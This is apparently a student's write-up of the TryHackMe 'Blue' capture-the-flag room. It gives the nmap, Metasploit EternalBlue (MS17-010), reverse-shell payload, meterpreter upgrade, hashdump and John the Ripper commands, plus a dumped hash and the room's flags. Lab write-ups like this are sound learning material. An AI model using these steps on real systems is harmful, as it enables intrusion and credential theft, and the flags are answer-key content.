# Write Up Blue Machine

This document is a write up of the CTF Blue in Try Hack Me.

## Task1 - Recon

- Q: Scan the machine.
- C: nmap -sV -sC MACHINE_IP -vv 

- Q: How many ports are open with a port number under 1000?
- A: 3

- Q: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
- A: MS17-010
- How? I looked it up on google: "Windows 7 microsoft-ds exploit"

## Task2 - Gain Access

- Q: Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
- A: exploit/windows/smb/ms17_010_eternalblue
- C: 
   ``` bash
     msfconsole
     search ms17-010
   ```

- Q: Show options and set the one required value. What is the name of this value? (All caps for submission)
- A: RHOSTS

Now i have use: set payload windows/x64/shell/reverse_tcp  , as suggested. 
Running the exploit ends up giving me access, finishing this task.

## Task3 - Escalate

- Q: If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
- A: post/multi/manage/shell_to_meterpreter
- C: on msfconsole i used: search shell_to_meterpreter

- Q:Select this (use MODULE_PATH). Show options, what option are we required to change?
- A: Session

With this, i set Session to 1 (my session id from the target machine) and converted shell to meterpreter. 
Now we go to session 2 (meterpreter session): sessions 2

Use "getuid" to get the NT requested.

## Task4 - Cracking

- Q: Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
- A: Jon

- Q: Copy this password hash to a file and research how to crack it. What is the cracked password?
- A:
- C: use hashdump
     (Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::)
    with jon the ripper on ffb43f0de35be4d9917ac0cc8ad57f8d:
        ```bash
            john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt

        ```


## Task5 - Flags
 Flag1: flag{access_the_machine} at C:\
 Flag2: flag{sam_database_elevated_access} at C:\Windows\System32\config
 Flag3: flag{admin_documents_can_be_valuable} at C:\Users\Jon\Documents
